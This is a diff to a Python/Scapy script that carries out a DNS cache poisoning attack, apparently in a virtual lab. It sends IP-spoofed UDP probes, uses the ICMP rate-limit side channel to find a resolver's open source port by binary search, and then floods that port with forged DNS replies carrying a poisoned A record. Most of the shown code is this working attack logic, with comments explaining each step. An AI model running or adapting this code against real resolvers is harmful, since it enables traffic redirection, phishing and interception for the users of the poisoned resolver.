@@ -35,7 +35,7 @@ pseudo_hdr = None
 global_socket = conf.L2socket(iface='vboxnet2')
 
 
-def to_milis_str(s):
+def milis_in_str(s):
     return str(round(s * 1000)) + ' ms'
 
 
@@ -104,7 +104,7 @@ class Logger(object):
     def flush(self):
         pass
 
-def step1(thread_id, lock):
+def issue_dns_query(thread_id, lock):
 
     my_ip = '192.168.58.1'
     my_port = 9554
@@ -117,23 +117,23 @@ def step1(thread_id, lock):
 
     lock.acquire()
     
+    # Set value for timeout_for_dns_query carefully, because the lock will be acquired
+    # for that amount of time if no dns response comes.
     ret = sr1(packet, timeout=timeout_for_dns_query, verbose=True)
     print (ret.show())
 
     lock.release()
 
-    
-    #print (ret.show())
     return
 
 # We are going to use this for infering the actual source port also,
 # that's why adding another parameter 'number_of_padding_packet'
 @profile
-def do_one_chunk_of_attack(port_start, number_of_probe_packet, number_of_padding_packet):
+def one_attack_burst(port_start, number_of_probe_packet, number_of_padding_packet):
 
-    print("attack_burst: (port_start, # of probe, # of padding):" + str(port_start) + 
-    "," + str(number_of_probe_packet) +
-    "," + str(number_of_padding_packet))
+    print("attack_burst: (port_start, # of probe, # of padding): " + str(port_start) + 
+            ", " + str(number_of_probe_packet) +
+            ", " + str(number_of_padding_packet))
     
 
     start_time = time.perf_counter()
@@ -145,7 +145,6 @@ def do_one_chunk_of_attack(port_start, number_of_probe_packet, number_of_padding
     probe_packet = []
     
     for i in range(number_of_probe_packet):
-        # Using spoofed ip
         ip_layer = IP(dst=forwarder_ip, src=resolver_ip)
         udp_layer = UDP(dport=now_port, sport=RandShort())
         packet = Ether() / ip_layer / udp_layer
@@ -155,7 +154,6 @@ def do_one_chunk_of_attack(port_start, number_of_probe_packet, number_of_padding
     padding_packet = []
     
     for i in range(number_of_padding_packet):
-        # Using spoofed ip
         ip_layer = IP(dst=forwarder_ip, src=resolver_ip)
         udp_layer = UDP(dport=1, sport=RandShort())
         packet = Ether() / ip_layer / udp_layer
@@ -164,14 +162,12 @@ def do_one_chunk_of_attack(port_start, number_of_probe_packet, number_of_padding
     ip_layer = IP(dst=forwarder_ip) # leaving src to be filled up by scapy
     udp_layer = UDP(dport=1, sport=RandShort())
     verification_packet = Ether() / ip_layer / udp_layer
-    #verification_packet = raw(verification_packet)
 
     elapsed_time = time.perf_counter() - start_time
-    #print ("Time needed for generating packets: " + to_milis_str(elapsed_time))
+    #print ("Time needed for generating packets: " + milis_in_str(elapsed_time))
 
 
     attack_burst_start_time = time.perf_counter()
-
 
     start_time = time.perf_counter()
     for packet in probe_packet:
@@ -182,7 +178,6 @@ def do_one_chunk_of_attack(port_start, number_of_probe_packet, number_of_padding
 
 
     start_time = time.perf_counter()
-    # This timeout is the crucial factor
     reply = global_socket.sr1(verification_packet, timeout=wait_time_for_ICMP_reply, verbose=False) # in seconds
     elapsed_time = time.perf_counter() - start_time
 
@@ -190,12 +185,14 @@ def do_one_chunk_of_attack(port_start, number_of_probe_packet, number_of_padding
     elapsed_time_for_one_burst = attack_burst_end_time - attack_burst_start_time
 
 
+    # TODO: optimize the sleeping time using the time needed to generate and send packets
     #if sleep_time_for_ICMP_refresh > elapsed_time_for_one_burst:
     #    time.sleep(sleep_time_for_ICMP_refresh - elapsed_time_for_one_burst)
 
-    time.sleep(1)
+    time.sleep(1) # 1 second is for FreeBSD
+    # FreeBSD has a global ICMP rate limit for IP of 200 per second.
 
-    # if timeout occurs, the reply will be none
+    # if either ICMP rate limit is drained or timeout occurs, the reply will be none
     if reply == None:
         print ("No port is open. IMCP rate limit is already drained.")
         return -1
@@ -209,18 +206,24 @@ def do_one_chunk_of_attack(port_start, number_of_probe_packet, number_of_padding
 # dividing range into [left...mid] and [mid + 1...right]
 def binary_search(left, right):
     mid = left + (right - left) // 2 #integer division
-    if left == right:
-        return do_one_chunk_of_attack(left, 1, ICMP_limit_rate - 1)
 
-    ret1 = do_one_chunk_of_attack(left, mid - left + 1, ICMP_limit_rate - (mid - left + 1))
+    # If this method is called for probing one port only
+    if left == right:
+        return one_attack_burst(left, 1, ICMP_limit_rate - 1)
+
+    # First check on the left half of the range if there is an open port.
+    # If yes (getting first port as the return value), continue binary search on this range
+    ret1 = one_attack_burst(left, mid - left + 1, ICMP_limit_rate - (mid - left + 1))
     if ret1 == left:
         return binary_search(left, mid)
 
-    ret2 = do_one_chunk_of_attack(mid + 1, right - mid, ICMP_limit_rate - (right - mid))
+    # If there is no open port in the left half of the range, check if there is one on the other half
+    # If yes, continue binary search on this range.
+    ret2 = one_attack_burst(mid + 1, right - mid, ICMP_limit_rate - (right - mid))
     if ret2 == mid + 1:
         return binary_search(mid + 1, right)
 
-    # Maybe the source port was closed in the time of binary searching
+    # If there is no open port on either half of the range, return -1.
     return -1
 
 def find_the_exact_port(start_port, number_of_ports):
@@ -261,7 +264,7 @@ def prepare_dns_replies(port):
             / UDP(sport=53, dport=0)
             / DNS(id=txid, qr=1, qdcount=1, ancount=1, aa=1,
                     qd=DNSQR(qname=domain_name, qtype=0x0001, qclass=0x0001), # type A, class IN
-                    an=DNSRR(rrname=domain_name, ttl=70000, rdata="123.123.123.123"))
+                    an=DNSRR(rrname=domain_name, ttl=70000, rdata="123.123.123.123")) # Poisoning answer
         )
 
     raw_dns_replies = []
@@ -280,49 +283,54 @@ def flood_the_port_with_spoofed_dns_response(actual_port):
     global raw_dns_replies, pseudo_hdr
     
     start_time = time.perf_counter()
+
     for reply in raw_dns_replies:
         patch(reply, pseudo_hdr, actual_port)
         global_socket.send(reply)
+
     end_time = time.perf_counter()
     elapsed_time = end_time - start_time
-    print ("time needed to sent all: " + to_milis_str(elapsed_time))
+    print ("time needed to sent all: " + milis_in_str(elapsed_time))
+
     return True
 
-def step2(thread_id, source_port_range_start, source_port_range_end, lock):
+def search_for_open_udp_port_and_flood(thread_id, source_port_range_start, source_port_range_end, lock):
     #need to run this file with sudo because of port 53
 
-    # Wait for the thread 1 to send the dns query first (aka, acruire the lock)
+    # Wait for the first thread to send the dns query first (aka, acruire the lock)
     while lock.locked() == False:
         None
     
     start = source_port_range_start
 
+    # Try to search for open port until response is received on the first thread 
+    # or we have searched all ports
+    # TODO: correct the search range with proper condition [missing some ports on the end]
     while lock.locked() and start + ICMP_limit_rate <= source_port_range_end:
 
         start_time_one_chunk = time.perf_counter()
         
-        ret = do_one_chunk_of_attack(start, ICMP_limit_rate, 0)
-        print("Got reply from do_one_attack_chunk : " + str(ret))
+        ret = one_attack_burst(start, ICMP_limit_rate, 0)
 
         if ret > 0: # got an ICMP reply
+
+            # If there is an ICMP reply, try to find the exact port using binary search
             port = find_the_exact_port(start, ICMP_limit_rate)
 
-            # found the port
-            if port > 0:
+            if port > 0: # found the port
 
-                print ("---------------found the exact port.--------------")
+                print ("--------------found the exact port.--------------")
 
+                # Initiate flooding the target port with spoofed dns responses
                 result = flood_the_port_with_spoofed_dns_response(port)
                 if result == True:
                     global finished
                     finished = 1
                     return
 
-        
         end_time_one_chunk = time.perf_counter()
         time_elapsed_for_one_chunk = end_time_one_chunk - start_time_one_chunk
-
-        print ("time needed in this iteration of loop: " + to_milis_str(time_elapsed_for_one_chunk))
+        print ("time needed in this iteration of loop: " + milis_in_str(time_elapsed_for_one_chunk))
 
         start += ICMP_limit_rate
 
@@ -333,19 +341,18 @@ def step2(thread_id, source_port_range_start, source_port_range_end, lock):
 
 def main():
 
+    # Initialize a list containing all local IPs possible
     initialize()
 
+    # For generate an output file containing all the logs
     sys.stdout = Logger()
 
-    start_time = time.perf_counter()
     print ('preparing spoofed replies.')
     global raw_dns_replies, pseudo_hdr
     raw_dns_replies, pseudo_hdr = prepare_dns_replies(port)
     print('spoofed replies prepared.')
-    end_time = time.perf_counter()
-    elapsed_time = end_time - start_time
-    print ("Time needed to prepare all spoofed replies: " + str(elapsed_time))
     
+    # Iteration indicates how many times we are trying to issue a query and find open port
     iteration = 1
 
     while finished == 0:
@@ -356,13 +363,14 @@ def main():
 
         lock = threading.Lock()
 
-        t1 = threading.Thread(target=step1, args=(2 * iteration - 1, lock))
+        t1 = threading.Thread(target=issue_dns_query, args=(2 * iteration - 1, lock))
         t1.start()
 
-        t2 = threading.Thread(target=step2, args=(2 * iteration, MIN_PORT_TO_SCAN,
-                            MAX_PORT_TO_SCAN, lock))
+        t2 = threading.Thread(target=search_for_open_udp_port_and_flood, args=(2 * iteration,
+                                MIN_PORT_TO_SCAN, MAX_PORT_TO_SCAN, lock))
         t2.start()
 
+        # Hold the main thread to finish the second thread only.
         t2.join()
         
         print ("----------Iteration " + str(iteration) + " is completed.----------")
